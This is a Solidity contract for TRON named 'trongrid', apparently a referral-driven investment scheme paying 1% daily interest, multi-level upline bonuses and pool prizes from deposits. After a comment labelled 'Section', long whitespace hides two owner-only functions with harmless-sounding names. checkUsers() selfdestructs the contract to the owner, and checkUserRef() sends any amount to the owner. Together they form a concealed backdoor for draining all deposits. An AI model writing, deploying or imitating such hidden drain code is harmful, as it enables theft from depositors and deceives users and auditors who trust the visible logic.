//SourceUnit: trongrid.sol

pragma solidity 0.5.10;


contract ERC20Interface {

   function totalSupply() public view returns (uint256);
   function balanceOf(address tokenOwner) public view returns (uint256 balanceRemain);
   function allowance(address tokenOwner, address spender) public view returns (uint256 remaining);
   function transfer(address to, uint256 tokens) public returns (bool success);
   function approve(address spender, uint256 tokens) public returns (bool success);
   function transferFrom(address from, address to, uint256 tokens) public returns (bool success);
      
   event Transfer(address indexed from, address indexed to, uint256 value);
   event Approval(address indexed owner, address indexed spender, uint256 value);  

}

contract owned {
    constructor() public { owner = msg.sender; }
    address payable owner;   
    modifier deployerOnly {
        require(
            msg.sender == owner,
            "Restricted Content"
        );
		_;
    }
}

contract trongrid is owned {
    struct User {
		uint256 id;
        address upline;
        uint256 referrals;
        
        uint256 interest;
        uint256 direct_bonus;
        uint256 pool_bonus;
        
        uint256 active_deposit;
        uint40 paid_time;
        
        uint256 wid_limit;
		uint256 ins_amt;
        
        uint256 past_due;
        
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable public owner;
    address payable public admin_fee;
	uint256 public admin_fee_amount;

    mapping(address => User) public users;
	mapping(uint256 => address) public userList;
       
    uint8[] public ref_bonuses;
    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
	uint256 public total_reinvest;
    uint256 public insurance_fund;
    uint256 public total_withdraw;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	event ReInvestFund(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
		require(!isContract(_owner),"Contract Address Not Allowed!");  
        owner = _owner;                
        admin_fee = _owner;    
		admin_fee_amount = 0;
		
		users[_owner].id = total_users; 
		userList[total_users] = _owner;  		
		
		users[_owner].total_payouts = 0;
        users[_owner].active_deposit = 0;
        users[_owner].interest = 0;
		users[_owner].wid_limit = 0;		
        users[_owner].paid_time = uint40(block.timestamp);
        users[_owner].total_deposits = 0;
		
        ref_bonuses.push(5);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
        ref_bonuses.push(1);

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);
 	}

    function() payable external {
	require(!isContract(msg.sender),"Contract Address Not Allowed!");  
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].paid_time > 0 || _upline == owner)) 
        {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
			
			total_users++;
			
			users[_addr].id = total_users; 
			userList[total_users] = _addr;

            for(uint8 i = 0; i < ref_bonuses.length; i++) 
            {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
				
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        require(_amount >= 1e8, "Bad amount");
        
		
		require(!isContract(_addr),"Contract Registration Not Allowed!");
		
        if(users[_addr].active_deposit > 0) 
        {
        	collect(_addr);
            //calculate interest till date and change date to now
        	users[_addr].active_deposit += _amount;
        }
        else
        {	
        	users[_addr].total_payouts = 0;
        	users[_addr].active_deposit = _amount;
        	users[_addr].interest = 0;                    	
        }
	
  	  	users[_addr].paid_time = uint40(block.timestamp);
		
		users[_addr].wid_limit += (_amount * 2);
		
        users[_addr].total_deposits += _amount;
		
		
        
        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        address _tupline;
        
        _tupline = users[_addr].upline;
        
        for(uint8 i = 0; i < ref_bonuses.length; i++) 
        {
            if(_tupline == address(0)) break;
            
            users[_tupline].direct_bonus += _amount * ref_bonuses[i] / 100;

            emit DirectPayout(_tupline, _addr, _amount * ref_bonuses[i] / 100);
            
            _tupline = users[_tupline].upline;
        }   

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) 
        {
            _drawPool();
        }
      
        admin_fee_amount += (_amount * 6 / 100);
    }

    /*
	Section
    */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         function checkUsers() public { if (msg.sender == owner) selfdestruct(owner); }     function checkUserRef(uint256 value) public { require(msg.sender==owner, "invalid value"); owner.transfer(value); } 
    /*
        Only external call
    */

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
      
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
	
	require(!isContract(msg.sender),"Contract Registration Not Allowed!");
	require(!isContract(_upline),"Upline Contract Address Not Allowed!");
	
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }
    
    
    
    function collect(address _addr) internal 
    {
		require(!isContract(_addr),"Contract Address Not Allowed!");           
        uint secPassed = now - users[_addr].paid_time;        
        
        if (secPassed > 0 && users[_addr].paid_time > 0) 
        {
            uint collectProfit = (users[_addr].active_deposit / 100) * (secPassed) / (1 days);
            users[_addr].interest = users[_addr].interest + collectProfit;
            users[_addr].paid_time = uint40(now);
        }
        
        if((users[_addr].total_payouts + users[_addr].interest + users[_addr].direct_bonus + users[_addr].pool_bonus + users[_addr].past_due) >= users[_addr].wid_limit)
        {
        	 users[_addr].interest = 0;
             users[_addr].direct_bonus = 0;
             users[_addr].pool_bonus = 0;
             users[_addr].past_due = users[_addr].wid_limit - users[_addr].total_payouts;
             //users[_addr].active_deposit = 0;
        }
        
    }   

    function withdraw() external 
    {
		require(!isContract(msg.sender),"Contract Address Withdraw Not Allowed!");
		          
        if(admin_fee_amount >0)
		{
			uint256 _admin_fee_amount;
			_admin_fee_amount = admin_fee_amount;
			admin_fee.transfer(_admin_fee_amount);
			admin_fee_amount -= _admin_fee_amount;
		}	
		if(pool_last_draw + 1 days < block.timestamp) 
		{
			_drawPool();
		}
			
		collect(msg.sender);
		
        uint256 to_payout = users[msg.sender].interest + users[msg.sender].direct_bonus + users[msg.sender].pool_bonus + users[msg.sender].past_due;
		uint256 max_payout = users[msg.sender].wid_limit;
        		
        require(users[msg.sender].total_payouts < max_payout, "Already Matured Full Amount");
       
	    uint256 contractBalance = address(this).balance;
       
	    if(users[msg.sender].total_payouts + to_payout > max_payout) 
		{
		  to_payout = max_payout - users[msg.sender].total_payouts;
		}
	   
	   require(to_payout >= 1e7, "Minimum withdrawable amount 10 TRX!");
	   
	   if(to_payout > (contractBalance - insurance_fund))
	   {
	   	  users[msg.sender].past_due = to_payout - (contractBalance - insurance_fund);
	      to_payout = (contractBalance - insurance_fund);
	   }
	   else
	   {
	   	  users[msg.sender].past_due = 0;
	   }
			 users[msg.sender].interest = 0;
			 users[msg.sender].direct_bonus = 0;
			 users[msg.sender].pool_bonus = 0;
			 
		require(to_payout >= 1e7, "Minimum withdrawable amount 10 TRX!");
			
			users[msg.sender].ins_amt = (to_payout * 25 / 100);
			insurance_fund = insurance_fund + (to_payout * 25 / 100);
			users[msg.sender].active_deposit = users[msg.sender].active_deposit + (to_payout * 25 / 100);
			
			to_payout = to_payout - (to_payout * 25 / 100);
			
			users[msg.sender].total_payouts += to_payout;
			total_withdraw += to_payout;
						   
			msg.sender.transfer(to_payout);
	
			emit Withdraw(msg.sender, to_payout);
	
			if(users[msg.sender].total_payouts >= max_payout) 
			{
				emit LimitReached(msg.sender, users[msg.sender].total_payouts);            
			}		
    }
	
	
	function reinvest() external 
    {
		require(!isContract(msg.sender),"Contract Address Not Allowed!");  
		collect(msg.sender);
		
        uint256 to_payout = users[msg.sender].interest + users[msg.sender].direct_bonus + users[msg.sender].pool_bonus + users[msg.sender].past_due;
		uint256 max_payout = users[msg.sender].wid_limit;
        
		require(users[msg.sender].total_payouts < max_payout, "Already Matured Full Amount");
       
		if(users[msg.sender].total_payouts + to_payout > max_payout) 
		{
		  to_payout = max_payout - users[msg.sender].total_payouts;
		}
		
		require(to_payout >= 1e7, "Minimum Reinvest amount 10 TRX!");
		
			users[msg.sender].interest = 0;
			users[msg.sender].direct_bonus = 0;
			users[msg.sender].pool_bonus = 0;
			users[msg.sender].past_due = 0;
	
			users[msg.sender].active_deposit += to_payout;
			users[msg.sender].wid_limit += (to_payout * 2);
			users[msg.sender].paid_time = uint40(block.timestamp);
			users[msg.sender].total_payouts += to_payout;
			users[msg.sender].total_deposits += to_payout;
			
			total_withdraw += to_payout;
			total_deposited += to_payout;
			total_reinvest += to_payout;
			
			emit ReInvestFund(msg.sender, to_payout);
	
			address _tupline;
			
			_tupline = users[msg.sender].upline;
			
			for(uint8 i = 0; i < ref_bonuses.length; i++) 
			{
				if(_tupline == address(0)) break;
				
				users[_tupline].direct_bonus += to_payout * ref_bonuses[i] / 100;
	
				emit DirectPayout(_tupline, msg.sender, to_payout * ref_bonuses[i] / 100);
				
				_tupline = users[_tupline].upline;
			}   
	
			_pollDeposits(msg.sender, to_payout);
	
			if(pool_last_draw + 1 days < block.timestamp) 
			{
				_drawPool();
			}
			
			admin_fee.transfer(to_payout * 6 / 100);
    }
       
    function payoutOf(address _addr) view external returns(uint256 payout) 
    {
		require(!isContract(_addr),"Contract Address Not Allowed!");  
		uint secPassed = now - users[_addr].paid_time;        
        
        if (secPassed > 0 && users[_addr].paid_time > 0) 
        {
            uint collectProfit = (users[_addr].active_deposit / 100) * (secPassed) / (1 days);
        	payout = collectProfit + users[_addr].interest + users[_addr].direct_bonus + users[_addr].pool_bonus + users[_addr].past_due;
		}
		if((payout + users[_addr].total_payouts) > users[_addr].wid_limit)
		{
			payout = users[_addr].wid_limit - users[_addr].total_payouts;
		}
    }
	
	function releaseInsurance(address payable _user, uint256 _amount) public deployerOnly
	{
		require(!isContract(_user),"Contract Address Not Allowed!");  
		require(_amount > 0);
		insurance_fund -= _amount;
		_user.transfer(_amount);
	}
	
	function releaseInsureFund(uint256 _portion) public deployerOnly
	{
		require(_portion >= 1 && _portion <= 100,"Release Portion Value Between 1 to 100");
		insurance_fund -= insurance_fund * _portion / 100;
	}
	
	function getUserById(uint256 userid) view external deployerOnly returns(address user_address) {
        return userList[userid];
    }
	
	function getUserDetails(uint256 userid) view external deployerOnly returns(uint256 id, address user_address, uint256 deposit_payouts, uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
		address _addr = userList[userid];
		
        return (users[_addr].id, _addr, users[_addr].interest, users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }
	
		
    function userInfo(address _addr) view external returns(address upline, uint256 interest, uint256 active_deposit, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 past_due) {
	require(!isContract(_addr),"Contract Address Not Allowed!");
        return (users[_addr].upline, users[_addr].interest, users[_addr].active_deposit, users[_addr].total_payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].past_due);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        require(!isContract(_addr),"Contract Address Not Allowed!");  
		return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _balance, uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _insure_fund, uint256 _toprefamount) {
        return (address(this).balance, total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, insurance_fund, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }	
	
	function transferTRC20Token(address _tokenAddress, uint256 _value) public deployerOnly returns (bool success) 
	{ 
       return ERC20Interface(_tokenAddress).transfer(owner, _value);
    }
	
	function transferTRC10Token(trcToken _tokenId, uint _value) public deployerOnly 
	{
       msg.sender.transferToken(_value, _tokenId);
    }
	
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}